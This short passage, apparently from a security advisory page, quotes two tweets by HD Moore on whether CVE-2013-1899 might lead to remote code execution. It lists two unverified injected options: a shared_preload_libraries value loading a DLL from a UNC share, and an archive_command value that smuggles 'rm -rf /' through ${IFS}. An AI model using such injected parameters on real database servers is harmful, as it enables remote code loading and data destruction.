HD Moore's quick tweets on possible exploitability of CVE-2013-1899 into
remote code execution (beyond the attack vectors mentioned in
"2013-04-04 Security Release FAQ" above):

<@hdmoore> @quine exploitation seems tricky, I wonder if -c shared_preload_libraries=\\unc\share\blah.dll is doable
<@hdmoore> @quine Another options appears to be something like: -c archive_command=rm${IFS}-rf${IFS}/

Indeed, these have not been verified yet and they might not be doable.
